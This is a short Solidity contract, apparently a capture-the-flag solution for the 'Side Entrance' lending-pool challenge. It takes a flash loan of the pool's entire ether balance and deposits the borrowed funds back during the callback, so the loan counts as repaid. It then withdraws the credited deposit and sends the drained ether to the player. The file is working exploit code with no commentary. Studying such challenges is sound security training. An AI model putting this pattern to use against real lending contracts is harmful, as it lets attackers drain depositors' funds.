// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    address pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function attack(address _player) public {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);
        SideEntranceLenderPool(pool).withdraw();
        payable(_player).transfer(address(this).balance);
    }

    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}
